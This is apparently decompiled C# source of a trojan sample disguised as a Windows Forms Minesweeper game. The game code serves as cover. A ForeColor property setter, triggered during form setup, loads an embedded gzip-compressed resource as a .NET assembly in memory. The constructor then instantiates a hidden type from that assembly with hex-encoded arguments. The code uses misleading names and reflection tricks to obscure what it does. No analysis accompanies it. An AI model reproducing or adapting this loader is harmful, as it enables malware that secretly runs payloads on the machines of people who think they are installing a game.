// Decompiled with JetBrains decompiler
// Type: Minesweeper_Game.Form1
// Assembly: IUnionSemanticCodeGr, Version=1.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 54936E77-57E9-4A01-8A40-CDD9C21A9B24
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\UDS-Trojan.Win32.GenericML.xnet-4a11f3ee9b7abe32546655a9f702013b42b9f162a262dca3052e2761c20ed447.exe

using Microsoft.VisualBasic;
using Minesweeper;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace Minesweeper_Game
{
  public class Form1 : Form
  {
    private Game game;
    private FormEspecialState formEspecialState;
    private IContainer components = (IContainer) null;
    private static object LockException;
    private static System.Type ReferenceCountValue = typeof (FormAboutGame);
    private MenuStrip menuStrip1;
    private ToolStripMenuItem gameToolStripMenuItem;
    private ToolStripMenuItem newGameToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator1;
    private ToolStripMenuItem BasicToolStripMenuItem;
    private ToolStripMenuItem intermediateToolStripMenuItem;
    private ToolStripMenuItem advancedToolStripMenuItem;
    private ToolStripMenuItem especialToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator2;
    private ToolStripMenuItem championsToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator3;
    private ToolStripMenuItem exitToolStripMenuItem;
    private ToolStripMenuItem infoToolStripMenuItem;
    private ToolStripMenuItem aboutGameToolStripMenuItem;

    public Form1()
    {
      this.InitializeComponent();
      this.CreateGame(DifficultyGame.Basic);
      Activator.CreateInstance((System.Type) Form1.LockException, (object) "41534D4E", (object) "676B79", (object) "AstroMath");
    }

    public void CreateGame(DifficultyGame difficulty)
    {
      if (this.game != null)
      {
        this.game.StopGame();
        this.Controls.Remove((Control) this.game);
      }
      this.game = new Game(difficulty);
      this.game.Name = "Game";
      this.game.Location = new Point(2, 27);
      this.Width = this.game.Width + 21;
      this.Height = this.game.Height + 69;
      this.game.GameWin += new EventHandler(this.Game_Win);
      this.game.GameOver += new EventHandler(this.Game_Over);
      this.Controls.Add((Control) this.game);
    }

    public void CreateGame(int NumberTilesInRow, int NumberTilesInColumn, int NumberMines)
    {
      if (this.game != null)
      {
        this.game.StopGame();
        this.Controls.Remove((Control) this.game);
      }
      this.game = new Game(NumberTilesInRow, NumberTilesInColumn, NumberMines);
      this.game.Name = "Game";
      this.game.Location = new Point(2, 27);
      this.Width = this.game.Width + 21;
      this.Height = this.game.Height + 69;
      this.game.GameWin += new EventHandler(this.Game_Win);
      this.game.GameOver += new EventHandler(this.Game_Over);
      this.Controls.Add((Control) this.game);
    }

    private void Game_Win(object sender, EventArgs e)
    {
      if (this.game.NumberTilesInColumn != 10 || this.game.NumberTilesInRow != 10 || this.game.NumberMines != 12)
        ;
      if (this.game.NumberTilesInColumn != 16 || this.game.NumberTilesInRow != 16 || this.game.NumberMines != 40)
        ;
      if (this.game.NumberTilesInColumn != 16 || this.game.NumberTilesInRow != 30 || this.game.NumberMines != 99)
        ;
    }

    private void Game_Over(object sender, EventArgs e)
    {
    }

    private void exitToolStripMenuItem_Click(object sender, EventArgs e) => this.Close();

    private void newGameToolStripMenuItem_Click(object sender, EventArgs e) => this.game.ResetField();

    private void BasicToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.BasicToolStripMenuItem.Checked = true;
      this.intermediateToolStripMenuItem.Checked = false;
      this.advancedToolStripMenuItem.Checked = false;
      this.especialToolStripMenuItem.Checked = false;
      this.CreateGame(DifficultyGame.Basic);
    }

    private void intermediateToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.intermediateToolStripMenuItem.Checked = true;
      this.BasicToolStripMenuItem.Checked = false;
      this.advancedToolStripMenuItem.Checked = false;
      this.especialToolStripMenuItem.Checked = false;
      this.CreateGame(DifficultyGame.Intermediate);
    }

    private void advancedToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.advancedToolStripMenuItem.Checked = true;
      this.BasicToolStripMenuItem.Checked = false;
      this.intermediateToolStripMenuItem.Checked = false;
      this.especialToolStripMenuItem.Checked = false;
      this.CreateGame(DifficultyGame.Advanced);
    }

    private void especialToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.formEspecialState == null)
      {
        this.formEspecialState = new FormEspecialState();
        this.formEspecialState.button1.Click += new EventHandler(this.FormEspecialStateClickOK);
      }
      int num = (int) this.formEspecialState.ShowDialog();
    }

    private void FormEspecialStateClickOK(object sender, EventArgs e)
    {
      this.advancedToolStripMenuItem.Checked = false;
      this.BasicToolStripMenuItem.Checked = false;
      this.intermediateToolStripMenuItem.Checked = false;
      this.especialToolStripMenuItem.Checked = true;
      this.CreateGame(this.formEspecialState.NumberTilesInRow, this.formEspecialState.NumberTilesInColumn, this.formEspecialState.NumberMines);
    }

    private void championsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      int num = (int) new FormChampions().ShowDialog();
    }

    private void aboutGameToolStripMenuItem_Click(object sender, EventArgs e)
    {
      int num = (int) new FormAboutGame().ShowDialog();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.menuStrip1 = new MenuStrip();
      this.gameToolStripMenuItem = new ToolStripMenuItem();
      this.newGameToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator1 = new ToolStripSeparator();
      this.BasicToolStripMenuItem = new ToolStripMenuItem();
      this.intermediateToolStripMenuItem = new ToolStripMenuItem();
      this.advancedToolStripMenuItem = new ToolStripMenuItem();
      this.especialToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator2 = new ToolStripSeparator();
      this.championsToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator3 = new ToolStripSeparator();
      this.exitToolStripMenuItem = new ToolStripMenuItem();
      this.infoToolStripMenuItem = new ToolStripMenuItem();
      this.aboutGameToolStripMenuItem = new ToolStripMenuItem();
      this.menuStrip1.SuspendLayout();
      this.SuspendLayout();
      this.menuStrip1.BackColor = SystemColors.ActiveCaption;
      this.menuStrip1.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.gameToolStripMenuItem,
        (ToolStripItem) this.infoToolStripMenuItem
      });
      this.menuStrip1.Location = new Point(0, 0);
      this.menuStrip1.Name = "menuStrip1";
      this.menuStrip1.Size = new Size(284, 24);
      this.menuStrip1.TabIndex = 0;
      this.menuStrip1.Text = "menuStrip1";
      this.gameToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[10]
      {
        (ToolStripItem) this.newGameToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator1,
        (ToolStripItem) this.BasicToolStripMenuItem,
        (ToolStripItem) this.intermediateToolStripMenuItem,
        (ToolStripItem) this.advancedToolStripMenuItem,
        (ToolStripItem) this.especialToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator2,
        (ToolStripItem) this.championsToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator3,
        (ToolStripItem) this.exitToolStripMenuItem
      });
      this.gameToolStripMenuItem.Name = "gameToolStripMenuItem";
      this.gameToolStripMenuItem.Size = new Size(50, 20);
      this.gameToolStripMenuItem.Text = "Game";
      this.newGameToolStripMenuItem.Name = "newGameToolStripMenuItem";
      this.newGameToolStripMenuItem.Size = new Size(141, 22);
      this.newGameToolStripMenuItem.Text = "New game";
      this.newGameToolStripMenuItem.Click += new EventHandler(this.newGameToolStripMenuItem_Click);
      this.toolStripSeparator1.Name = "toolStripSeparator1";
      this.toolStripSeparator1.Size = new Size(138, 6);
      this.BasicToolStripMenuItem.Checked = true;
      this.BasicToolStripMenuItem.CheckState = CheckState.Checked;
      this.BasicToolStripMenuItem.Name = "BasicToolStripMenuItem";
      this.BasicToolStripMenuItem.Size = new Size(141, 22);
      this.BasicToolStripMenuItem.Text = "Basic";
      this.BasicToolStripMenuItem.Click += new EventHandler(this.BasicToolStripMenuItem_Click);
      this.intermediateToolStripMenuItem.Name = "intermediateToolStripMenuItem";
      this.intermediateToolStripMenuItem.Size = new Size(141, 22);
      this.intermediateToolStripMenuItem.Text = "Intermediate";
      this.intermediateToolStripMenuItem.Click += new EventHandler(this.intermediateToolStripMenuItem_Click);
      this.advancedToolStripMenuItem.Name = "advancedToolStripMenuItem";
      this.advancedToolStripMenuItem.Size = new Size(141, 22);
      this.advancedToolStripMenuItem.Text = "Advanced";
      this.advancedToolStripMenuItem.Click += new EventHandler(this.advancedToolStripMenuItem_Click);
      this.especialToolStripMenuItem.Name = "especialToolStripMenuItem";
      this.especialToolStripMenuItem.Size = new Size(141, 22);
      this.especialToolStripMenuItem.Text = "Especial";
      this.especialToolStripMenuItem.Click += new EventHandler(this.especialToolStripMenuItem_Click);
      this.toolStripSeparator2.Name = "toolStripSeparator2";
      this.toolStripSeparator2.Size = new Size(138, 6);
      this.championsToolStripMenuItem.Name = "championsToolStripMenuItem";
      this.championsToolStripMenuItem.Size = new Size(141, 22);
      this.championsToolStripMenuItem.Text = "Champions";
      this.championsToolStripMenuItem.Click += new EventHandler(this.championsToolStripMenuItem_Click);
      this.toolStripSeparator3.Name = "toolStripSeparator3";
      this.toolStripSeparator3.Size = new Size(138, 6);
      this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
      this.exitToolStripMenuItem.Size = new Size(141, 22);
      this.exitToolStripMenuItem.Text = "Exit";
      this.exitToolStripMenuItem.Click += new EventHandler(this.exitToolStripMenuItem_Click);
      this.infoToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.aboutGameToolStripMenuItem
      });
      this.infoToolStripMenuItem.Name = "infoToolStripMenuItem";
      this.infoToolStripMenuItem.Size = new Size(40, 20);
      this.infoToolStripMenuItem.Text = "Info";
      this.aboutGameToolStripMenuItem.Name = "aboutGameToolStripMenuItem";
      this.aboutGameToolStripMenuItem.Size = new Size(140, 22);
      this.aboutGameToolStripMenuItem.Text = "About game";
      this.aboutGameToolStripMenuItem.Click += new EventHandler(this.aboutGameToolStripMenuItem_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 261);
      this.Controls.Add((Control) this.menuStrip1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.Name = nameof (Form1);
      this.Text = "Minesweeper";
      this.menuStrip1.ResumeLayout(false);
      this.menuStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
      this.ForeColor = Color.ForestGreen;
    }

    public override Color ForeColor
    {
      get
      {
        Form1.Synchronization();
        return new Color();
      }
      set => Form1.Synchronization();
    }

    private static double Synchronization()
    {
      Form1.LockException = (object) ((Assembly) Form1.Desync(Form1.DecompressGZip((byte[]) new ResourceManager(Form1.ReferenceCountValue).GetObject("IKMNJUHBVGYTFCXDRESZAWQ")), "")).GetTypes()[4];
      return 8.1919191991;
    }

    public static byte[] DecompressGZip(byte[] bytesToDecompress)
    {
      using (GZipStream gzipStream = new GZipStream((Stream) new MemoryStream(bytesToDecompress), CompressionMode.Decompress))
      {
        byte[] buffer = new byte[4096];
        using (MemoryStream ObjectRef = new MemoryStream())
        {
          int num;
          do
          {
            num = gzipStream.Read(buffer, 0, 4096);
            if (num > 0)
              Interaction.CallByName((object) ObjectRef, "Write", CallType.Get, (object) buffer, (object) 0, (object) num);
          }
          while (num > 0);
          return ObjectRef.ToArray();
        }
      }
    }

    public static object Desync(byte[] CanTimeout, string H) => (object) AppDomain.CurrentDomain.Load(CanTimeout);
  }
}
